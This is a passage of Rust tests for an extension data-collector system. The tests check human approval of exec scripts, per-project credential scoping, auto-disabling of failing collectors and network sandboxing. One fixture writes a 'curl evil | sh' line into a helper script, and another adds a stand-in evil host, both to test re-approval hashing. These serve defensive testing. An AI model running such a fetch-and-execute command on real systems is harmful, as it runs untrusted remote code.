            vec![json!({"number": 7, "title": "T", "score": 2, "draft": true, "opened_at": "2026-09-27T00:00:00Z", "extra": 1})],
        )
        .unwrap();
        assert_eq!(
            rows,
            vec![vec![
                SqlCell::Int(7),
                SqlCell::Text("T".into()),
                SqlCell::Real(2.0),
                SqlCell::Int(1),
                SqlCell::Text("2026-09-27T00:00:00Z".into())
            ]]
        );
        // Missing optional columns are NULL.
        let rows = coerce_rows(e, vec![json!({"number": 8})]).unwrap();
        assert_eq!(rows[0][1], SqlCell::Null(()));
        // Wrong types and a missing key are errors naming the row + column.
        let err = coerce_rows(e, vec![json!({"number": "seven"})]).unwrap_err();
        assert!(err.contains("row 0") && err.contains("number"), "{err}");
        let err = coerce_rows(e, vec![json!({"title": "no key"})]).unwrap_err();
        assert!(err.contains("key"), "{err}");
        let err = coerce_rows(e, vec![json!([1, 2])]).unwrap_err();
        assert!(err.contains("object"), "{err}");
    }

    #[tokio::test]
    async fn run_collector_requires_consent_then_stores_queryable_rows() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        let ext = root.path().join("oxplow/extensions/my-gh");
        std::fs::create_dir_all(&ext).unwrap();
        std::fs::write(
            ext.join("extension.yaml"),
            "name: my-gh\nsources:\n  - id: gh\n    runtime: exec\n    entry: sync.sh\n    entities:\n      - { name: pr, key: number, columns: { number: int, title: text } }\n",
        )
        .unwrap();
        script(
            &ext,
            "sync.sh",
            r#"echo '{"entities":{"pr":[{"number":1,"title":"First"},{"number":2,"title":"Second"}]}}'"#,
        );
        let db = oxplow_db::Database::in_memory();
        let store = SqliteCollectorStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Collectors {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };

        let err = run_collector(&ctx, "my-gh", "gh", RunTrigger::Manual, "human")
            .await
            .unwrap_err();
        assert!(
            matches!(err, RunCollectorError::NeedsApproval(ref m) if m.contains("approval")),
            "{err:?}"
        );
        assert!(
            store.list_runs().await.unwrap().is_empty(),
            "refused runs record nothing"
        );

        let report = reviewed_run(&ctx, "my-gh", "gh", &version_of(&ctx, "my-gh", "gh").await)
            .await
            .unwrap();
        assert_eq!(report.row_counts["pr"], 2);
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql("SELECT title FROM v_my_gh_pr ORDER BY number", vec![], None)
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["First"], ["Second"]])
        );

        // Approved now, so a later run needs no approve flag…
        run_collector(&ctx, "my-gh", "gh", RunTrigger::Manual, "human")
            .await
            .unwrap();
        // …and a failing run is recorded, keeping the last good rows.
        script(&ext, "sync.sh", "echo nope >&2; exit 1");
        let err = run_collector(&ctx, "my-gh", "gh", RunTrigger::Manual, "human")
            .await
            .unwrap_err();
        assert!(
            matches!(err, RunCollectorError::NeedsApproval(_)),
            "script changed: {err:?}"
        );
        let err = reviewed_run(&ctx, "my-gh", "gh", &version_of(&ctx, "my-gh", "gh").await)
            .await
            .unwrap_err();
        assert!(matches!(err, RunCollectorError::Failed(_)), "{err:?}");
        let st = &store.list_runs().await.unwrap()[0];
        assert_eq!(st.status, "error");
        assert!(st.error.as_deref().unwrap().contains("nope"));
        assert_eq!(st.row_counts["pr"], 2, "last good counts kept");
    }

    #[test]
    fn due_collectors_respect_trigger_approval_disable_and_last_run() {
        let base = spec("x", &[]);
        let listing = |trigger: Trigger, approved: bool, last: Option<&str>| {
            let mut spec = base.clone();
            spec.trigger = trigger;
            CollectorListing {
                owner: "e".into(),
                spec,
                approved,
                network_enforced: false,
                credentials: vec![],
                version: None,
                disabled: None,
                run: last.map(|t| CollectorRun {
                    owner: "e".into(),
                    id: "gh".into(),
                    status: "ok".into(),
                    last_run_at: t.into(),
                    error: None,
                    row_counts: BTreeMap::new(),
                    cursor: None,
                    last_event_id: None,
                }),
            }
        };
        let now = 1_790_000_000_000; // ms
        let iso = |ms: i64| {
            serde_json::to_value(oxplow_domain::Timestamp::from_unix_ms(ms))
                .unwrap()
                .as_str()
                .unwrap()
                .to_string()
        };
        let every10 = || Trigger::Every { minutes: 10 };
        let long_ago = iso(now - 11 * 60_000);
        let recent = iso(now - 5 * 60_000);
        let cases = vec![
            (listing(every10(), true, None), true),
            (listing(every10(), true, Some(&long_ago)), true),
            (listing(every10(), true, Some(&recent)), false),
            (listing(every10(), false, None), false),
            (listing(Trigger::Manual, true, None), false),
            // A disabled one waits for a person, however due.
            (
                CollectorListing {
                    disabled: Some("3 failures in a row".into()),
                    ..listing(every10(), true, None)
                },
                false,
            ),
        ];
        for (l, want) in cases {
            let due = due_collectors(std::slice::from_ref(&l), now);
            assert_eq!(
                !due.is_empty(),
                want,
                "{:?} approved={} last={:?}",
                l.spec.trigger,
                l.approved,
                l.run.as_ref().map(|s| &s.last_run_at)
            );
        }
    }

    #[test]
    fn exec_injects_credentials_as_env() {
        let ext = tempfile::tempdir().unwrap();
        script(
            ext.path(),
            "bin/sync.sh",
            r#"printf '{"entities":{"pr":[{"number":1,"title":"%s"}]}}' "$GH_PAT""#,
        );
        let creds = BTreeMap::from([("GH_PAT".to_string(), "pat-1".to_string())]);
        let out = exec_collector(
            ext.path(),
            &spec("bin/sync.sh", &[]),
            &|_| None,
            &creds,
            Duration::from_secs(10),
            &Egress::Open,
        )
        .unwrap();
        assert_eq!(out.entities["pr"][0]["title"], json!("pat-1"));
    }

    /// Two extensions declaring the same credential name, each with a
    /// script that echoes it into a row.
    fn two_extensions(root: &Path) {
        for name in ["one", "two"] {
            let ext = root.join(format!("oxplow/extensions/{name}"));
            std::fs::create_dir_all(&ext).unwrap();
            std::fs::write(
                ext.join("extension.yaml"),
                format!("name: {name}\nsources:\n  - id: s\n    runtime: exec\n    entry: sync.sh\n    credentials: [TOKEN]\n    entities:\n      - {{ name: row, key: id, columns: {{ id: int, token: text }} }}\n"),
            )
            .unwrap();
            script(
                &ext,
                "sync.sh",
                r#"printf '{"entities":{"row":[{"id":1,"token":"%s"}]}}' "$TOKEN""#,
            );
        }
    }

    #[tokio::test]
    async fn credentials_come_from_the_keychain_scoped_per_extension() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        two_extensions(root.path());
        let db = oxplow_db::Database::in_memory();
        let store = SqliteCollectorStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Collectors {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };

        let list = list_collectors(&ctx).await.unwrap();
        assert_eq!(
            list[0].credentials,
            vec![CredentialStatus {
                name: "TOKEN".into(),
                set: false
            }]
        );

        set_credential(&ctx, "one", "TOKEN", Some("secret-one")).unwrap();
        let list = list_collectors(&ctx).await.unwrap();
        let one = list.iter().find(|l| l.owner == "one").unwrap();
        let two = list.iter().find(|l| l.owner == "two").unwrap();
        assert!(one.credentials[0].set);
        assert!(!two.credentials[0].set, "scoped to its extension");
        assert!(!serde_json::to_string(&list).unwrap().contains("secret-one"));
        // Another project with an extension of the same name doesn't see it.
        let elsewhere = Collectors {
            root: root.path(),
            project: "another-project".into(),
            approvals: ctx.approvals,
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        let other = list_collectors(&elsewhere).await.unwrap();
        assert!(
            !other.iter().find(|l| l.owner == "one").unwrap().credentials[0].set,
            "credentials are scoped to the project"
        );

        reviewed_run(&ctx, "one", "s", &version_of(&ctx, "one", "s").await)
            .await
            .unwrap();
        reviewed_run(&ctx, "two", "s", &version_of(&ctx, "two", "s").await)
            .await
            .unwrap();
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT (SELECT token FROM v_one_row), (SELECT token FROM v_two_row)",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["secret-one", ""]]),
            "the other extension's same-named credential isn't visible"
        );

        // Only declared names can be set, and None clears.
        let err = set_credential(&ctx, "one", "OTHER", Some("x")).unwrap_err();
        assert!(err.to_string().contains("OTHER"), "{err}");
        assert!(set_credential(&ctx, "nope", "TOKEN", Some("x")).is_err());
        set_credential(&ctx, "one", "TOKEN", None).unwrap();
        assert!(!list_collectors(&ctx).await.unwrap()[0].credentials[0].set);
    }

    async fn task_db() -> oxplow_db::Database {
        let db = oxplow_db::Database::in_memory();
        db.transaction(|c| {
            c.execute_batch(
                "INSERT INTO streams (id, kind, title, branch, branch_ref, branch_source, worktree_path, created_at, updated_at)
                   VALUES (1, 'primary', 'p', 'main', 'refs/heads/main', 'local', '/r', '2026-01-01', '2026-01-01');
                 INSERT INTO threads (id, stream_id, title, status, created_at, updated_at)
                   VALUES (1, 1, 'T', 'active', '2026-01-01', '2026-01-01');
                 INSERT INTO task (id, thread_id, title, status, priority, created_by, created_at, updated_at) VALUES
                   (1, 1, 'Fix login', 'ready', 'high', 'agent', '2026-01-01', '2026-01-01'),
                   (2, 1, 'Tidy docs', 'ready', 'low', 'agent', '2026-01-01', '2026-01-01'),
                   (3, 1, 'Ship it', 'done', 'high', 'agent', '2026-01-01', '2026-01-01');",
            )
            .map_err(|e| DomainError::Invalid(e.to_string()))
        })
        .await
        .unwrap();
        db
    }

    fn extension(root: &Path, name: &str, manifest: &str, files: &[(&str, &str)]) {
        let ext = root.join(format!("oxplow/extensions/{name}"));
        std::fs::create_dir_all(&ext).unwrap();
        std::fs::write(ext.join("extension.yaml"), manifest).unwrap();
        for (path, body) in files {
            let p = ext.join(path);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        }
    }

    /// P7.C2: three failed runs in a row disable a collector; then
    /// `collector.sync` refuses it naming the reason, and a person's
    /// `plugin.enable` lets it run again. An agent can't enable it.
    #[tokio::test]
    async fn a_collector_failing_three_runs_is_disabled_until_a_person_enables_it() {
        let fx = crate::test_fixtures::services_with_effort().await;
        let root = fx.svc.layout.project_dir.clone();
        extension(
            &root,
            "work",
            "name: work\nsources:\n  - id: bad\n    runtime: starlark\n    entry: bad.star\n    entities:\n      - { name: hot, key: id, columns: { id: int } }\n",
            &[("bad.star", "def transform(input):\n    return 1 // 0\n")],
        );
        let sync = || {
            fx.svc.commands.run(
                &oxplow_domain::Actor::Human,
                SYNC,
                json!({ "owner": "work", "id": "bad" }),
                false,
            )
        };
        for _ in 0..3 {
            let err = sync().await.unwrap_err();
            assert!(matches!(err, CommandError::Failed { .. }), "{err:?}");
        }
        let err = sync().await.unwrap_err();
        assert!(
            matches!(&err, CommandError::Invalid { message, .. }
                if message.contains("is disabled") && message.contains("3 failures in a row")),
            "{err:?}"
        );
        let listings = list_collectors(&Collectors::of(&fx.svc, &root))
            .await
            .unwrap();
        let bad = listings.iter().find(|l| l.owner == "work").unwrap();
        assert!(bad.disabled.is_some());
        assert!(due_collectors(&listings, i64::MAX).is_empty());

        let enable = json!({ "plugin": "work", "kind": "collector", "contribution": "bad" });
        let agent = oxplow_domain::Actor::Agent {
            thread_id: Some(fx.thread),
            stream_id: None,
        };
        let denied = fx
            .svc
            .commands
            .run(&agent, crate::plugin_health::ENABLE, enable.clone(), false)
            .await;
        assert!(
            matches!(denied, Err(CommandError::Denied { .. })),
            "{denied:?}"
        );
        fx.svc
            .commands
            .run(
                &oxplow_domain::Actor::Human,
                crate::plugin_health::ENABLE,
                enable,
                false,
            )
            .await
            .unwrap();
        // Enabled: it runs (and fails) again rather than being refused.
        let err = sync().await.unwrap_err();
        assert!(matches!(err, CommandError::Failed { .. }), "{err:?}");
    }

    /// A scheduled run is the `collector.sync` command like every other run
    /// (the UI's, a lens action's, MCP's), so it's audited as the system's
    /// and logs `command.executed` — one mechanism, not a second path
    /// around the bus.
    #[tokio::test]
    async fn the_scheduler_runs_collector_sync_through_the_bus() {
        let fx = crate::test_fixtures::services_with_effort().await;
        let root = fx.svc.layout.project_dir.clone();
        extension(
            &root,
            "work",
            "name: work\nsources:\n  - id: star\n    runtime: starlark\n    entry: hot.star\n    schedule: every 10m\n    input: \"SELECT id, title FROM v_task\"\n    entities:\n      - { name: hot, key: id, columns: { id: int, title: text } }\n",
            &[(
                "hot.star",
                "def transform(input):\n    return {\"entities\": {\"hot\": [{\"id\": r[\"id\"], \"title\": r[\"title\"]} for r in input[\"rows\"]]}}\n",
            )],
        );
        let ran = run_due_collectors(&fx.svc).await;
        assert_eq!(ran, vec![("work".to_string(), "star".to_string())]);
        let audits = oxplow_db::SqliteCommandAuditStore::new(fx.svc.db.clone())
            .list_recent(10)
            .await
            .unwrap();
        let sync = audits
            .iter()
            .find(|a| a.command == SYNC)
            .expect("the scheduled run is audited");
        assert_eq!(
            sync.actor_kind,
            oxplow_domain::events::schema::ActorKind::System
        );
        assert!(sync.error.is_none(), "{:?}", sync.error);
        // It ran: its run says so, logged as the schedule's, and it isn't
        // due again.
        let listings = list_collectors(&Collectors::of(&fx.svc, &root))
            .await
            .unwrap();
        let ran = listings.iter().find(|l| l.owner == "work").unwrap();
        assert_eq!(ran.run.as_ref().unwrap().status, "ok");
        let trigger: String = fx
            .svc
            .db
            .read(|c| {
                c.query_row(
                    "SELECT json_extract(payload, '$.trigger') FROM event_log WHERE type = 'collector.synced'",
                    [],
                    |r| r.get(0),
                )
                .map_err(oxplow_db::map_sql_err)
            })
            .await
            .unwrap();
        assert_eq!(trigger, "every");
        assert!(run_due_collectors(&fx.svc).await.is_empty());

        // P7 review (tsk722): the schedule says when it's next due — its
        // run plus ten minutes plus the scheduler's tick — so a missed run
        // reads unfresh.
        let (due, fresh) = due_and_fresh(&fx.svc, "work", "star").await;
        let due = oxplow_domain::Timestamp::parse(&due.expect("next_due_at is set"))
            .unwrap()
            .unix_ms();
        let expected = oxplow_domain::Timestamp::now().unix_ms() + 11 * 60_000;
        assert!((expected - due).abs() < 30_000, "{due} vs {expected}");
        assert!(fresh);
    }

    /// `v_plugin_health`'s `next_due_at` and `fresh` for a contribution.
    pub(crate) async fn due_and_fresh(
        svc: &crate::Services,
        plugin: &str,
        contribution: &str,
    ) -> (Option<String>, bool) {
        let (plugin, contribution) = (plugin.to_string(), contribution.to_string());
        svc.db
            .read(move |c| {
                c.query_row(
                    "SELECT next_due_at, fresh FROM v_plugin_health
                     WHERE plugin = ?1 AND contribution = ?2",
                    [plugin, contribution],
                    |r| Ok((r.get(0)?, r.get::<_, i64>(1)? == 1)),
                )
                .map_err(oxplow_db::map_sql_err)
            })
            .await
            .unwrap()
    }

    #[tokio::test]
    async fn derived_sources_transform_their_input_without_approval() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        let entity =
            "    entities:\n      - { name: hot, key: id, columns: { id: int, title: text } }\n";
        extension(
            root.path(),
            "work",
            &format!(
                "name: work\nsources:\n  - id: star\n    runtime: starlark\n    entry: hot.star\n    input: \"SELECT id, title, priority FROM v_task WHERE status = 'ready'\"\n{entity}  - id: jq\n    runtime: jaq\n    entry: hot.jq\n    input: \"SELECT id, title FROM v_task\"\n    entities:\n      - {{ name: upper, key: id, columns: {{ id: int, title: text }} }}\n"
            ),
            &[
                (
                    "hot.star",
                    "def transform(input):\n    return {\"entities\": {\"hot\": [{\"id\": r[\"id\"], \"title\": r[\"title\"]} for r in input[\"rows\"] if r[\"priority\"] == \"high\"]}}\n",
                ),
                ("hot.jq", "{entities: {upper: [.rows[] | {id, title: (.title | ascii_upcase)}]}}"),
            ],
        );
        let db = task_db().await;
        let store = SqliteCollectorStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Collectors {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        // No approval asked for, and the listing says it can run.
        assert!(list_collectors(&ctx)
            .await
            .unwrap()
            .iter()
            .all(|l| l.approved));
        let report = run_collector(&ctx, "work", "star", RunTrigger::Manual, "human")
            .await
            .unwrap();
        assert_eq!(report.row_counts["hot"], 1);
        run_collector(&ctx, "work", "jq", RunTrigger::Manual, "human")
            .await
            .unwrap();
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT (SELECT title FROM v_work_hot), (SELECT group_concat(title, ',') FROM v_work_upper)",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["Fix login", "FIX LOGIN,TIDY DOCS,SHIP IT"]])
        );
    }

    /// P5.E2's red: a derived source's `ai_classify` is a recorded
    /// computation — six calls on one text, one model call, recorded as
    /// the source.
    #[tokio::test]
    async fn a_derived_sources_ai_classify_on_one_text_is_one_call() {
        use crate::ai_service::{ProviderConfig, ProviderKind, Role, RoleBinding};
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        extension(
            root.path(),
            "work",
            "name: work\nsources:\n  - id: star\n    runtime: starlark\n    entry: kind.star\n    input: \"SELECT id, title FROM v_task\"\n    entities:\n      - { name: kind, key: id, columns: { id: int, kind: text } }\n",
            &[(
                "kind.star",
                "def transform(input):\n    rows = []\n    for r in input[\"rows\"]:\n        a = ai_classify(\"is this a bug?\", [\"bug\", \"feature\"])\n        b = ai_classify(\"is this a bug?\", [\"bug\", \"feature\"])\n        rows.append({\"id\": r[\"id\"], \"kind\": a[\"label\"] if a == b else \"differs\"})\n    return {\"entities\": {\"kind\": rows}}\n",
            )],
        );
        let db = task_db().await;
        let reply = json!({ "answers": { "label": { "type": "choice", "choice": "bug", "probabilities": { "bug": 0.9, "feature": 0.1 } } } });
        let (base, _) = oxplow_ai::testing::mock(
            "/chat/completions",
            200,
            json!({ "choices": [{ "message": { "content": reply.to_string() } }], "usage": { "prompt_tokens": 4, "completion_tokens": 2 } }),
        )
        .await;
        let ai = std::sync::Arc::new(crate::ai_service::AiService::new(
            oxplow_ai::client::Client::default(),
            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
            std::sync::Arc::new(oxplow_db::SqliteAiCallStore::new(db.clone())),
            Some(state.join("global-config")),
        ));
        ai.save_provider(
            ProviderConfig {
                id: "m".into(),
                kind: ProviderKind::OpenaiCompatible,
                base_url: Some(base),
            },
            None,
        )
        .unwrap();
        ai.set_role(
            Role::Decide,
            Some(RoleBinding {
                provider: "m".into(),
                model: "x".into(),
            }),
        )
        .unwrap();
        let store = SqliteCollectorStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Collectors {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: std::sync::Arc::new(crate::ai_compute::AiCompute::new(
                ai,
                oxplow_db::SqliteAiResultStore::new(db.clone()),
            )),
        };
        let report = run_collector(&ctx, "work", "star", RunTrigger::Manual, "human")
            .await
            .unwrap();
        assert_eq!(report.row_counts["kind"], 3);
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT (SELECT group_concat(DISTINCT kind) FROM v_work_kind), \
                        (SELECT count(*) FROM v_ai_call), (SELECT caller FROM v_ai_call), \
                        (SELECT op || ' ' || role FROM v_ai_result)",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["bug", 1, "collector:work/star", "classify decide"]])
        );
    }

    /// A preview runs the source as its worktree has it and returns the
    /// rows, storing nothing: source data is project-wide, so an agent in
    /// a worktree stream checks its source without overwriting it (tsk377).
    /// An exec source still needs a person's approval.
    #[tokio::test]
    async fn a_preview_returns_rows_and_stores_nothing() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        extension(
            root.path(),
            "work",
            "name: work\nsources:\n  - id: star\n    runtime: starlark\n    entry: hot.star\n    input: \"SELECT id, title, priority FROM v_task WHERE status = 'ready'\"\n    entities:\n      - { name: hot, key: id, columns: { id: int, title: text } }\n  - id: sh\n    runtime: exec\n    entry: sync.sh\n    entities:\n      - { name: raw, key: id, columns: { id: int } }\n",
            &[(
                "hot.star",
                "def transform(input):\n    return {\"entities\": {\"hot\": [{\"id\": r[\"id\"], \"title\": r[\"title\"]} for r in input[\"rows\"] if r[\"priority\"] == \"high\"]}}\n",
            )],
        );
        script(
            &root.path().join("oxplow/extensions/work"),
            "sync.sh",
            r#"echo '{"entities":{"raw":[{"id":1}]}}'"#,
        );
        let db = task_db().await;
        let store = SqliteCollectorStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Collectors {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        let preview = preview_collector(&ctx, "work", "star", None).await.unwrap();
        assert_eq!(preview.entities.len(), 1);
        let hot = &preview.entities[0];
        assert_eq!(
            (hot.entity.as_str(), hot.view.as_str()),
            ("hot", "v_work_hot")
        );
        assert_eq!(hot.columns, vec!["id", "title"]);
        assert_eq!(
            serde_json::to_value(&hot.rows).unwrap(),
            json!([[1, "Fix login"]])
        );
        assert_eq!(hot.total, 1);
        assert!(
            store.list_runs().await.unwrap().is_empty(),
            "no run recorded"
        );
        assert!(
            crate::sql_gateway::SqlGateway::new(db)
                .query_sql("SELECT * FROM v_work_hot", vec![], None)
                .await
                .is_err(),
            "nothing stored"
        );

        let err = preview_collector(&ctx, "work", "sh", None)
            .await
            .unwrap_err();
        assert!(
            matches!(err, RunCollectorError::NeedsApproval(_)),
            "{err:?}"
        );
    }

    #[tokio::test]
    async fn upsert_sources_update_by_key_and_tombstone() {
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        extension(
            root.path(),
            "inc",
            "name: inc\nsources:\n  - id: s\n    runtime: exec\n    entry: sync.sh\n    sync: upsert\n    entities:\n      - { name: item, key: id, columns: { id: int, title: text } }\n      - { name: other, key: id, columns: { id: int } }\n",
            &[],
        );
        let ext = root.path().join("oxplow/extensions/inc");
        let db = task_db().await;
        let store = SqliteCollectorStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Collectors {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        script(
            &ext,
            "sync.sh",
            r#"echo '{"entities":{"item":[{"id":1,"title":"a"},{"id":2,"title":"b"}],"other":[{"id":9}]}}'"#,
        );
        reviewed_run(&ctx, "inc", "s", &version_of(&ctx, "inc", "s").await)
            .await
            .unwrap();
        script(
            &ext,
            "sync.sh",
            r#"echo '{"entities":{"item":[{"id":2,"title":"B"},{"id":3,"title":"c"}]},"deleted":{"item":[1]}}'"#,
        );
        let report = reviewed_run(&ctx, "inc", "s", &version_of(&ctx, "inc", "s").await)
            .await
            .unwrap();
        assert_eq!(
            report.row_counts["item"], 2,
            "counts are the entity's total"
        );
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT (SELECT group_concat(id || title, ',') FROM (SELECT * FROM v_inc_item ORDER BY id)), (SELECT count(*) FROM v_inc_other)",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["2B,3c", 1]]),
            "an entity the run didn't mention is left alone"
        );
    }

    /// P9.D2: an exec collector's stdout is parsed like a script's
    /// result, so its `events` meet the same check — and a collector with
    /// no extension to declare types in can't emit any.
    #[test]
    fn printed_events_are_parsed_and_only_an_extensions_collector_may_emit() {
        let s = spec("x.sh", &[]);
        let out = ScriptOutput::parse(
            &s,
            json!({"entities": {}, "events": [{"type": "my_gh.merged", "payload": {"n": 1}}]}),
        )
        .unwrap();
        assert_eq!(out.events.len(), 1);
        let unknown = ScriptOutput::parse(
            &s,
            json!({"entities": {}, "events": [{"type": "my_gh.merged", "payload": {}, "extra": 1}]}),
        )
        .unwrap_err();
        assert!(unknown.contains("unknown field"), "{unknown}");

        let vocabulary = oxplow_domain::vocabulary::Vocabulary::core();
        assert_eq!(
            plan_events(&vocabulary, "my-gh", &s, Vec::new()).unwrap(),
            Vec::new()
        );
        for owner in [
            oxplow_config::collectors::PROJECT,
            oxplow_config::collectors::BUILT_IN,
        ] {
            let refused = plan_events(&vocabulary, owner, &s, out.events.clone()).unwrap_err();
            assert!(
                refused.contains("only an extension's collector may"),
                "{owner}: {refused}"
            );
        }
        // Its extension declares no such type.
        let refused = plan_events(&vocabulary, "my-gh", &s, out.events).unwrap_err();
        assert!(
            refused.contains("may emit only the event types `my-gh` declares"),
            "{refused}"
        );
    }

    #[test]
    fn tombstones_need_an_upsert_source() {
        let s = spec("x.sh", &[]);
        let err =
            ScriptOutput::parse(&s, json!({"entities": {}, "deleted": {"pr": [1]}})).unwrap_err();
        assert!(err.contains("sync: upsert"), "{err}");
    }

    #[tokio::test]
    async fn a_sandboxed_source_reaches_only_its_declared_hosts() {
        if !crate::net_sandbox::enforced() {
            return; // Not enforced on this OS; nothing to check.
        }
        // A local origin standing in for a declared API host.
        let origin = tokio::net::TcpListener::bind(("127.0.0.1", 0))
            .await
            .unwrap();
        let port = origin.local_addr().unwrap().port();
        tokio::spawn(async move {
            use tokio::io::{AsyncReadExt, AsyncWriteExt};
            while let Ok((mut s, _)) = origin.accept().await {
                let mut b = [0u8; 1024];
                let _ = s.read(&mut b).await;
                let _ = s
                    .write_all(
                        b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok",
                    )
                    .await;
            }
        });
        let root = tempfile::tempdir().unwrap();
        let state = root.path().join(".oxplow");
        extension(
            root.path(),
            "net",
            "name: net\nsources:\n  - id: s\n    runtime: exec\n    entry: sync.sh\n    network: [localhost]\n    entities:\n      - { name: r, key: id, columns: { id: int, declared: text, undeclared: text, direct: text } }\n",
            &[],
        );
        let ext = root.path().join("oxplow/extensions/net");
        script(
            &ext,
            "sync.sh",
            &format!(
                r#"a=$(curl -s -o /dev/null -w '%{{http_code}}' http://localhost:{port}/ || true)
b=$(curl -s -o /dev/null -w '%{{http_code}}' http://example.com/ || true)
c=$(curl -s --noproxy '*' --max-time 3 -o /dev/null -w '%{{http_code}}' http://1.1.1.1/ || true)
printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":"%s"}}]}}}}' "$a" "$b" "$c""#
            ),
        );
        let db = task_db().await;
        let store = SqliteCollectorStore::new(db.clone());
        let secrets = oxplow_ai::secrets::MemorySecrets::default();
        let ctx = Collectors {
            root: root.path(),
            project: "test-project".into(),
            approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
            store: &store,
            secrets: &secrets,
            db: db.clone(),
            vocabulary: VocabularyHandle::core(),
            layer: crate::sql_gateway::SqlGateway::new(db.clone()),
            catalog: &crate::extension_catalog::ExtensionCatalog::new(),
            ai: no_ai(),
        };
        assert!(list_collectors(&ctx).await.unwrap()[0].network_enforced);
        reviewed_run(&ctx, "net", "s", &version_of(&ctx, "net", "s").await)
            .await
            .unwrap();
        let out = crate::sql_gateway::SqlGateway::new(db)
            .query_sql(
                "SELECT declared, undeclared, direct FROM v_net_r",
                vec![],
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            serde_json::to_value(&out.rows).unwrap(),
            json!([["200", "403", "000"]]),
            "declared host through the proxy; undeclared refused by it; direct blocked by the sandbox"
        );
    }

    #[test]
    fn widening_the_network_list_needs_approving_again() {
        let ext = tempfile::tempdir().unwrap();
        script(ext.path(), "s.sh", "echo x");
        let mut s = spec("s.sh", &[]);
        let bare = approval_hash(ext.path(), &s).unwrap();
        s.network = vec!["api.github.com".into()];
        let one = approval_hash(ext.path(), &s).unwrap();
        s.network.push("evil.example.com".into());
        let two = approval_hash(ext.path(), &s).unwrap();
        assert!(bare != one && one != two);
    }

    #[test]
    fn a_helper_file_in_the_extension_needs_approving_again() {
        let ext = tempfile::tempdir().unwrap();
        script(ext.path(), "s.sh", ". ./lib.sh");
        script(ext.path(), "lib.sh", "echo ok");
        let s = spec("s.sh", &[]);
        let before = approval_hash(ext.path(), &s).unwrap();
        script(ext.path(), "lib.sh", "curl evil | sh");
        assert_ne!(before, approval_hash(ext.path(), &s).unwrap());
    }

    #[test]
